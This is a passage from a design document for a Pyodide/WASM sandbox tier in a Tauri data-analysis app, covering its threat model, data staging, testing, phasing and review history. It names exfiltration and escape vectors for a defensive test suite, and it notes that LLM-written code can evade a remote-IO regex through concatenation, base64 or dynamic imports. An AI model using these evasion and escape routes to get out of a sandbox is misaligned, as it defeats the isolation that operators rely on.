  This is the _real, currently-open_ risk. Controlled by #2+#3+#4, proven by the
  escape suite (must include fetch/XHR/WebSocket/OPFS/`img` beacon vectors, not
  just "file open outside MEMFS").
- **T3 — Resource exhaustion.** `worker.terminate()` genuinely kills a busy WASM
  loop (real OS thread) — but (a) the WASM heap must be a **hard**
  `MAXIMUM_MEMORY` with growth disabled, or a malloc bomb OOMs the whole tab
  before any cap fires; (b) the wall-clock timeout must live on a **supervisor
  (main) context**, not inside the worker, or a busy worker starves its own
  timer. _(security F6.)_
- **T4 — Supply chain.** Pyodide + wheels + DuckDB-WASM are tens of MB of binary
  shipped in the bundle. Requirements: vendored `indexURL`, shipped
  `pyodide-lock.json` (per-wheel sha256), SRI on the DuckDB-WASM `.wasm`, and
  **affirmatively disable every runtime fetch path**: `loadPackage` CDN default,
  `micropip` (a network wheel installer — must be absent from the tier), and
  DuckDB-WASM's auto bundle-selector. Attested like the rest of the release.
- **T5 — Silent capability erosion / no-fallback pressure.** The
  `codeDoesRemoteIo` regex (`docker-utils.ts:65`) is trivially LLM-evadable
  (concat/base64/dynamic import) and only ever _narrowed_ a Docker grant — it is
  a **UX router, not the exfil boundary**. In the WASM tier the exfil boundary is
  #2+#3+#4 (which hold regardless of code content). Any "best-effort enable a
  bridge for this one remote read" path is **forbidden**, enforced by a test.

**Honesty note.** For the analyses it accepts, the tier can claim **Docker-parity
isolation** — but only after the four controls exist and the escape suite is
green. Until then it claims nothing.

## 8. Data staging (corrected — the sidecar is authoritative)

The CSV lives on the **sidecar** filesystem (`csv/storage.ts` `storeCSV`→`writeFile`),
not in the browser. So per run the main-thread relay must **ship the CSV bytes
sidecar→worker** and write them into Pyodide MEMFS at `/data/input.csv`. Concrete
decisions (both re-reviews' F4):

- **Step frames stay authoritative on the sidecar.** Investigate persists each
  step via `storeCSV` to sidecar disk (`persistStepOutput`), which also feeds
  history, the forensic record, and dashboards — invariants that require the
  sidecar to hold the frame. So a dependent step **re-ships** its input
  `step_N.csv` from the sidecar to MEMFS; MEMFS is a scratch cache, never the
  source of truth. (The alternative — MEMFS authoritative — would re-plumb
  history/audit and is rejected.) State the per-run/per-retry **byte budget** for
  shipping `input.csv` + dep frames; it bounds the transport and the §7 read cap.
  Frames cross `postMessage` as **Transferable `ArrayBuffer`s** (zero-copy), never
  structured-clone copies, or per-step memory doubles at scale. _(R5.)_
- **Warm-worker MEMFS per-run cleanup (security F7, gates Phase 2).** A reused
  worker must **wipe `/data/*` before staging each run**, mirroring the Docker
  warm-pool invariant (CLAUDE.md: cleanup in `writeFiles` BEFORE staging, nested
  skip-set). Fixed MEMFS paths (`/data/step_N.csv`) are **not** run-namespaced, so
  without the wipe run B can read run A's frames — a confused-deputy across a
  malicious-CSV boundary. The cleanup ordering + skip-set must be ported explicitly.
- `hermetic_runtime` → vendored wheel/asset into `sys.path` once per warm worker
  (survives the per-run `/data` wipe — it lives outside `/data`, like the Docker
  nested package).
- Results → `output.json`/`findings.jsonl`/images read back via the
  `parseSandboxOutput` `readFile` closure, **under the §7 read cap**, then
  **schema-clamped** (§7 #5) before anything reaches the composer.

## 9. Testing strategy (corrected parity gate)

- **Routing/capability tests** (pure): a `wasm` request with remote-IO / mount /
  over-cap is `reject`ed with an actionable message; a local-CSV request routes
  to the WASM executor.
- **Compute-parity tests** — run a fixture through Docker and WASM and assert
  **structural equality of findings/series/values/regimes + numeric parity within
  tolerance**, **exact** equality only for the pure-`math` p-value machinery.
  **Not** byte-identical `output.json`: numpy/scipy use different BLAS
  native-vs-WASM and matplotlib PNG bytes are nondeterministic (the `images`
  dict, `output.py:82`) — v1's byte-comparable gate was unachievable. _(PE F3.)_
- **`hermetic_runtime` under Pyodide** — add a Pyodide leg importing the package
  and running the p-value/regime tests in-WASM (wheel-compat proof).
- **Adversarial isolation suite (ship-gating)** — runs in a **real browser/webview
  under the production execution-context CSP**, not Node. The full vector list is
  in §7 (fetch/XHR/WebSocket/`img`/OPFS/`invoke`/FS-outside-MEMFS/httpfs **plus**
  the three the architecture forces: worker `postMessage` non-envelope → relay
  drops it; `fetch` still fails with the FFI scrub **disabled** (CSP-alone proof);
  `new Worker`/iframe fresh realm). Node-Pyodide (Phase 0a/1a) cannot exercise this.
- **e2e** — a no-Docker end-to-end (`wasm` runtime, Docker unavailable) ingesting
  a CSV → rendered dashboard, in Playwright.
- **Golden** — a WASM-tier journey once the codegen variant is stable.

## 10. Phasing (re-scoped)

- **Phase 0 — four de-risking spikes (~1–2 weeks, NOT "days"), no product
  commitment.** The re-reviews showed the load-bearing unknowns are the transport
  and the sync/async shim, not just the escape suite:
  (a) _Compute + latency:_ Node-Pyodide loads the vendored `hermetic_runtime`, runs
  a pandas+numpy+scipy fixture, proves **structural+tolerance parity** (§9),
  **measures the memory ceiling** on 5/25/50 MB CSVs (→ the §5 cap; the **value
  gate**), AND measures **cold-start init latency** (Pyodide + wheel load) so the
  1c cold-start-per-run regression vs Docker's warm pool is a known number, not a
  launch surprise. _(R3.)_
  (b) _Boundary + transport + COOP/COEP:_ a minimal **Tauri webview + dedicated
  worker** running Pyodide under the **one coherent exec-CSP** (§7 #2) with
  **COOP/COEP** enabled, a **`postMessage` transport stub** feeding the worker
  code + CSV bytes and returning an envelope (§4a/F1), and a **DuckDB-in-second-
  worker + `Atomics.wait`** proof (§6-A). **Exit criterion (R1):** SAB works
  **without regressing basemap/CDN rendering** — `COEP: require-corp` blocks
  cross-origin subresources (cartocdn tiles, huggingface assets) unless the exec
  context is served from a **separate cross-origin-isolated Tauri origin** while
  the main app stays non-isolated (then the relay crosses origins). Prove one of
  these works, don't just "enable COOP/COEP." The **escape suite** (incl.
  postMessage relay, scrub-disabled-CSP-still-blocks, fresh-realm) must pass here
  — Node (Phase 0a/1a) cannot exercise it.
  (c) _Sidecar packaging:_ boot the existing lib as a **bundled standalone Next
  server + `@napi-rs/keyring` native addon** spawned as a Tauri `externalBin`;
  confirm `setPathRoots` under app-data, keychain availability, and `process.env`
  all work. Proves "reuse the lib" is actually reuse, not a rewrite.
  (d) _Remote egress (day-0 scope):_ a **Rust-core fetch stub** that host-allowlists
  from a derived source, resolve-and-rejects an internal IP, and returns bytes to
  the worker's MEMFS (§6a). Proves the remote path end-to-end and that the worker
  stays `connect-src 'none'`. Small, but it validates the day-0 remote claim.
- **Phase 1a — executor + routing + caps, Node-worker, CI/parity-only, flag-gated.**
  Reuses Phase 0(a). Hardens the compute path + capability gate + the new
  `executeSandbox` **plan-kind and dispatch branch** in CI, **no user egress
  path** (so it is safe to build now and the FFI risk doesn't gate it).
- **Phase 1b-shim — the DuckDB-WASM shim + its sync/async bridge (§6).** Its own
  phase (PE F2): the SAB/Atomics bridge or the async-codegen contract, proven on
  Phase 0(b)'s COOP/COEP infra.
- **Phase 1b-ingest — schema-extract-in-worker + the WASM codegen variant + the
  row/byte cap.** Schema extraction and the large-data path are Docker-hardcoded
  (`schema-extractor.ts`, `materialize.ts`); their DuckDB-WASM equivalents land here.
- **Phase 1b-remote — the Rust-core egress proxy (§6a), day-0 remote reads.** Port
  `egress-proxy.py`'s allowlist + resolve-and-reject + terminating-fetch guarantees
  (§6a) + server-side creds to Rust; wire the worker's remote-read request → core →
  MEMFS bytes. Its isolation cases (T6) join the escape suite. **`supportsRemoteIO`
  stays FALSE** until the 1c-controls suite (incl. the nine §6a vectors) is green —
  the flag flips there, next to `supportsNetworkPolicy`, never in 1b. _(C2.)_
  Depends on 0(b)/0(d) + the async bridge.
- **Phase 1c-transport — the sidecar↔webview `postMessage` handoff (§4a):** the
  bidirectional protocol, worker readiness/liveness, reload-mid-run, the
  concurrency model (worker pool vs serialize), and the main-thread envelope relay.
  **Open (R4):** consider a **core-mediated relay** (Rust core ↔ worker) so the
  privileged sidecar channel does not live on the attacker-influenced render thread
  — the core is already trusted and in-loop for egress. (Creds are already off the
  main thread — §6a — so this is channel-authority, not credential exposure.)
- **Phase 1c-controls — the five §7 controls + output clamp + the ship-gating
  escape suite.** `supportsNetworkPolicy:true` **and** `supportsRemoteIO:true` flip
  **only** when the expanded suite (fetch/…/fresh-realm + the nine §6a vectors) is
  green. This + 1c-transport are the real no-Docker UX.
- **Phase 2 — warm Pyodide pool + Investigate multi-step** with the **per-run
  MEMFS wipe** invariant (§8/F7) as a correctness precondition.
- **Phase 3 — Tauri productionization**: installers, auto-update, signing, the
  no-Docker first-run wizard (replacing `start.sh`), bundle-size/pinning (T4).

Docker remains the untouched power-tier throughout.

## 11. Runtime selection & failure (new — PE F6)

- **Selection:** `getActiveSandboxRuntime()` (today constant `"docker"`) gains
  Docker-absence detection (the `/api/runtimes` availability probe) → default to
  `wasm` when Docker is unavailable, `docker` otherwise; user-overridable.
- **Failure with no fallback:** when a no-Docker user hits a Docker-only analysis
  (remote/big-data/over-cap) or the WASM run itself fails, there is **no
  fallback** — a hard dead-end. The UX must name it honestly ("this dataset is
  large/remote and needs the Docker power-tier; here's how to enable it") rather
  than silently narrowing scope. Rollback: the runtime is a setting; Docker users
  are unaffected and can ignore the tier entirely.
- **Honesty: no-Docker is necessary, not sufficient, for "download and run."** The
  non-technical user still needs an **LLM** — either an API key or a bundled/local
  model. Removing Docker removes _one_ wall; the auth/model wall remains. The
  distribution plan's answer (subscription "Sign in with Claude" via claude-cli, or
  a bundled local model) must ship alongside this tier or "download and run" is
  still blocked at first prompt. Tracked with the Tauri first-run wizard (Phase 3).

## 12. Settled vs. open

**Settled (2026-08-26):** placement = Option B browser sandbox, reached via the
Tauri **Node-sidecar + webview-worker** model (§4a) — headless MCP/CLI stay
Docker-only; DuckDB-WASM shim in Phase 1, not pandas-first (§6); Tauri is the
committed delivery vehicle.

**Still open (do not gate Phase 0):**

1. **Row/byte cap (§5/§6)** — the input-size ceiling before the tier says "use
   Docker." Set empirically from Phase 0(a) memory measurements.
2. **Bundle size / integrity (T4)** — confirm the tens-of-MB desktop download
   budget and the exact vendoring/pinning (Pyodide `indexURL` +
   `pyodide-lock.json` shas, DuckDB-WASM SRI, micropip absent).
3. **Concurrency model (§4a)** — worker pool size vs. explicit serialization for
   parallel Investigate waves + the six concurrent callers. Prototype in Phase 0(b),
   decide in 1c-transport.
4. **DuckDB sync/async bridge (§6)** — SAB+`Atomics.wait`+COOP/COEP (recommended)
   vs. async-codegen contract. Resolved by the Phase 0(b) proof.
5. **Long-term: keep the Node sidecar, or eventually fold the pipeline into the
   webview?** The sidecar is the pragmatic reuse-everything choice; a pure-webview
   future (no bundled Node) is a separate, later question — explicitly deferred.

## 13. Review provenance

- v1 → **security review** (B−): refuted "safe by construction / no network" (the
  `import js` FFI + the permissive live CSP `middleware.ts:154`); boundary reframed
  as enforced CSP+FFI. **PE review** (B−): execute step is inside a stateful
  retry/review loop with six callers; pandas-first fights the DuckDB-spill memory
  strategy; byte-parity gate corrected; Phase 1a Node-worker CI-only decoupling.
- v2 → **product sign-off**: GUI/desktop-only; Tauri vehicle; Node-sidecar +
  webview-worker model (§4a).
- v2.3 → **product directive**: remote reads (https/s3/gs) are **day-0**, not
  deferred. Resolved with the Rust-core egress proxy (§6a) — worker stays
  `connect-src 'none'` + httpfs-off, the trusted core does the allowlisted fetch
  (resolve-and-reject, creds off the worker — stronger than Docker), beating the
  browser CORS/rebinding limits. Separated the _remote_ axis (day-0, size-capped)
  from the _large-data_ axis (Docker-forever, physics). Cost: async/COOP/COEP and a
  Rust egress port become foundational; remote is tied to the Tauri build.
- v2.3 §6a → **security re-review** (B−): architecture sound, creds-off-worker
  verified genuinely stronger than Docker — but the invariants were too loose. v2.4
  pins them: (1) allowlist derived from the **stored** source URL (worker URL only
  validated against it, path opaque); (2) the run's authorized `source_id` set
  **out-of-band by the sidecar**, not the worker (closes a cross-source /
  local-run confused deputy the long-lived shared core would otherwise allow);
  (3) "direct port" replaced by explicit terminating-fetch guarantees (no
  auto-redirect / per-hop re-validation, cert validation, a **stated** desktop
  RFC-1918-reject policy that diverges from `egress-proxy.py`, read-only GET);
  (4) an **engineered** streaming download cap (byte-count abort, untrusted
  Content-Length). Nine §6a vectors added to the ship-gating suite.
- **Microsandbox assessed as an alternative and rejected (for this goal).** It is
  a microVM runtime = a Docker-class **external install** (installer + daemon +
  hypervisor: KVM/HVF/WHPX) — it does not solve "bundle-and-run, no install," and
  it was removed precisely because it **can't enforce `--network none`**
  (`constants.ts:166-171`, PR #108), a regression on the axis this product prizes.
  Its one edge (full CPython capability) is Docker's job and lands on users who
  don't need a new runtime. Pyodide+WASM is the only option that ships **inside**
  the app and can hold Docker's isolation line; Pyodide specifically because it
  ships the prebuilt numpy/pandas/scipy wheels the runtime needs (WASI-CPython
  can't). Microsandbox stays shelved.
- v2.6 → **Phase 0(b) build finding** (`e2e/wasm-escape-suite.spec.ts`, real
  chromium): the escape suite passes — `connect-src 'none'` blocks
  fetch/XHR/WebSocket/sendBeacon/EventSource from the worker, and a `fetch`
  reference captured before any scrub is still blocked (CSP is the boundary). It
  **caught a real §7 bug**: the exec-CSP's `script-src 'self'` permitted
  same-origin `importScripts()`/`import()` exfil (data in the URL). Corrected to
  `script-src blob: 'wasm-unsafe-eval'` (Pyodide loads from blob:, not 'self').
- v2.5 → **correction**: warehouse pulls are NOT a WASM non-goal (v2.4's §2 was
  wrong). Warehouse connection/query runs in the **sidecar** via native drivers
  (`run-ask-query.ts:203/227`, `run-investigate-query.ts:218`), returning CSV the
  worker analyzes with no sandbox egress; only the result _size_ is capped
  (`materialize-result.ts:76` already CSV-paths a non-Docker run). All seven
  warehouses supported; large pulls' Parquet materialization → in-worker DuckDB-WASM
  (1b-ingest) or Docker. Sidecar bundle must carry the drivers' native addons (0c).
- v2.4 → **final-gate review (A−, GO)**: verified all four §6a fixes closed against
  code (the `getStoredCSV → egressPolicyFor(stored)` derivation, the out-of-band
  csvId flow, `egress-proxy.py`'s deliberate RFC-1918-allow that the desktop core
  overrides, creds-off-worker); confirmed the exec-CSP contradiction fixed and no
  stale "remote is a non-goal" text. Folded in: C1 (Phase 0 = four spikes), C2
  (`supportsRemoteIO` flips in 1c-controls, not 1b), R1 (COOP/COEP must not regress
  basemap rendering — an explicit 0(b) exit criterion), R2 (§7 #5a clamp is
  depth/size/count bounds, not a type-closed schema — the open registries are
  intentional), R3 (cold-start latency measured in 0(a)), R4 (core-mediated relay
  option for 1c), R5 (Transferable ArrayBuffers for frame re-ship), R6 (download
  cap N ≈ the §5 memory cap). No finding gated the GO.
- v2.1 → **security re-review** (B / borderline B+): the boundary spans the
  worker's _output_ too — poisoned `z.unknown()` output launders into the trusted
  composer prompt and renders under the app CSP; the `connect-src 'none'` worker
  can't speak localhost so transport is `postMessage`-relay (a mandatory exfil
  channel); the delete-scrub is a denylist (CSP is load-bearing); the exec-CSP was
  self-contradictory; add read cap, output schema-clamp, `setByPath` proto guard,
  warm-MEMFS wipe. **PE re-review** (B): the handoff is a server→client inversion
  (transport is the real unknown, into Phase 0); the DuckDB shim hides a sync/async
  mismatch (COOP/COEP); parallel-Investigate vs one worker; step-frame persistence
  conflict; Next-as-sidecar packaging is real work; "download and run" still needs
  an LLM key/model. **All folded into v2.2 above.**
